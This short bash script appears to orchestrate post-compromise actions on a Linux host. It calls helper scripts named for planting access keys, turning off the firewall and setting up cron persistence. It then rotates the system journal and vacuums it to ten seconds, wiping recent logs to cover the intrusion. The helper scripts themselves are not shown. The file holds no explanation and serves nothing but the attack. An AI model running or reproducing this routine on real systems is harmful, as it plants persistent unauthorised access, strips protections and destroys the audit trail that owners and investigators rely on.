#!/bin/bash

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"

bash "${SCRIPT_DIR}"/keyPlanting.sh
bash "${SCRIPT_DIR}"/firewallOff.sh
bash "${SCRIPT_DIR}"/cronPersistence.sh

sudo journalctl --rotate
sudo journalctl --vacuum-time=10s